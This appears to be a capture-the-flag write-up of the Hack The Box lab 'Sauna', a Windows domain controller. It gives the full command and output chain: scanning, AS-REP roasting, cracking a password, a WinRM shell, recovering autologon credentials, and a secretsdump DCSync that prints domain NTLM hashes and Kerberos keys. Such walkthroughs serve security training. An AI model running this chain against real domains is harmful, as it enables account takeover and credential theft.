
![image](https://user-images.githubusercontent.com/68326057/117306804-a23df500-ae9d-11eb-9183-213bb8247eb2.png) 


# NMAP

```bash
PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-05-06 20:41:09Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1h36m51s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35558/tcp): CLEAN (Timeout)
|   Check 2 (port 57990/tcp): CLEAN (Timeout)
|   Check 3 (port 33198/udp): CLEAN (Timeout)
|   Check 4 (port 57297/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-06T20:41:22
|_  start_date: N/A

```

# SMB

```bash
$ crackmapexec smb 10.10.10.175
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
```

![image](https://user-images.githubusercontent.com/68326057/117307498-40ca5600-ae9e-11eb-92e0-8203a8fa2ac0.png)


# WEB

## about.html

(Potential Users)

```bash
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

```bash
POSSIBLE USERNAMES

FSmith
HBear
SKerb
SCoins
BTaylor
SDriver
F.Smith
H.Bear
S.Kerb
S.Coins
B.Taylor
S.Driver
Fergus.Smith
Hugo.Bear
Steven.Kerb
Shaun.Coins
Bowie.Taylor
Sophie.Driver
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
administrator (Since it is windows)
guest
```

# kerbrute

```bash
 go run main.go userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL ../../htb-vip/sauna/users
 ```
 
 ```
     __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 05/07/21 - Ronnie Flathers @ropnop

2021/05/07 00:54:17 >  Using KDC(s):
2021/05/07 00:54:17 >   10.10.10.175:88

2021/05/07 00:54:18 >  [+] FSmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$FSmith@EGOTISTICAL-BANK.LOCAL:d1cd6803f14df935d517f4167516d917$381b98150804d37f6f09dcae24d76baebe906e796b9566f924a952e5c8ac01fdb29fec3869ef361ad13fcb58deee0132ea5aa8f0b8d4584e354de7c0b54af55c6ae2dc8586a0ecdf96843c742c34ca67fe5a4082e3e4d764984509e5633832e6b7554d1229bba2bbc4fc558ec8423f083c700ff871f07e382354f89403c85d439c8e407f6b84e862228ae0621243a3e5f3e4b68aab24efe3c3512fcf0206a0c626a626c32dfcbeae77e108818738f3e994c466b4f8f627a1d12c9f8fd7fa4b7760d4b77897a175e1bc694271890518d11750af3fd95f6da8ed015b7f0c2fc91325aad43647938dd08a42fdd72a2faea1da28af6bca53401a4fb9001c9d2e70b155328ea6297128f08ed1c03f555e748385e6f61e1b54
2021/05/07 00:54:18 >  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL
2021/05/07 00:54:19 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2021/05/07 00:54:19 >  Done! Tested 26 usernames (2 valid) in 1.196 seconds
```

# GetNPusers.py

```bash
python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/FSMITH -dc-ip 10.10.10.175 -no-pass
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for FSMITH
$krb5asrep$23$FSMITH@EGOTISTICAL-BANK.LOCAL:47070802cd9ce87221577cf2eca50ae3$c00699293317e04995d220dde191550760601a02a6191b7519fc0e435bdc30208351f19cd81eded86a266c6546a77c787f7165b6b7ad442dfa4dfa4fc5df0b42a159ae818daf569248443992a6b0d3a14b56fc0b1015d0df332108fd36209a99d4875192ac59f2e2f46656f97615955dc631e840ed3382ca04ae5c9b486d1b3c9b58c3c9c32cc78de2a002346791f63cab473d3e2c0f606328cb9ea6e0d5084aaa6c2558649843a2d5eabf6d908c2ead491f61d566ce810183ee2cfda635e950915ce1cb20a7236af8de6f4a298ec286c68fdd3515244faf0beb2347b1f620e7f6a34dec5b4687fe50addd7bd2d9c753d6ac44c635b9c3376f7b88e23c86b42c
```

# John

```bash
john --wordlist=../../rockyou.txt newhash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$FSMITH@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:22 DONE (2021-05-07 01:01) 0.04418g/s 465709p/s 465709c/s 465709C/s Thr33som3..Thehoops12
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
FSMITH:Thestrokes23
```

# Psexec

```bash
python3 psexec.py EGOTISTICAL-BANK.LOCAL/FSMITH:Thestrokes23@10.10.10.175
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'print$' is not writable.
[-] share 'SYSVOL' is not writable.
```

```bash
 evil-winrm -i 10.10.10.175 -u FSmith -p Thestrokes23

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> 
```

# Users

![image](https://user-images.githubusercontent.com/68326057/117312386-9ef93800-aea2-11eb-87c2-896724a9b9b8.png)

PowerUp.ps1
```bash
[*] Checking for Autologon credentials in registry...


DefaultDomainName    : EGOTISTICALBANK
DefaultUserName      : EGOTISTICALBANK\svc_loanmanager
DefaultPassword      : Moneymakestheworldgoround!
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :

[*] Checking %PATH% for potentially hijackable .dll locations...                                                                       
                                                                                                                                       
                                                                                                                                       
HijackablePath : C:\Users\FSmith\AppData\Local\Microsoft\WindowsApps\                                                                  
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\FSmith\AppDat  a\Local\Microsoft\WindowsApps\\wlbsctrl.dll' -Command '...'        
```

```bash
python3 /opt/impacket/examples/secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:a927344cfdf7904bd2f64a2810a3c556:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:ddd7a6e42497efe30305b21c22fadf6ca43d29aca00dd5b8c888b1014ab928f0
SAUNA$:aes128-cts-hmac-sha1-96:a124616b1b2eb74e677a16ebcd7a9486
SAUNA$:des-cbc-md5:e9fe643e31c870df
[*] Cleaning up... 
```

# Administrator

![image](https://user-images.githubusercontent.com/68326057/117316731-7b37f100-aea6-11eb-8562-0cc09644367b.png)

![image](https://user-images.githubusercontent.com/68326057/117316796-8ee35780-aea6-11eb-9774-d19f67f4892b.png)

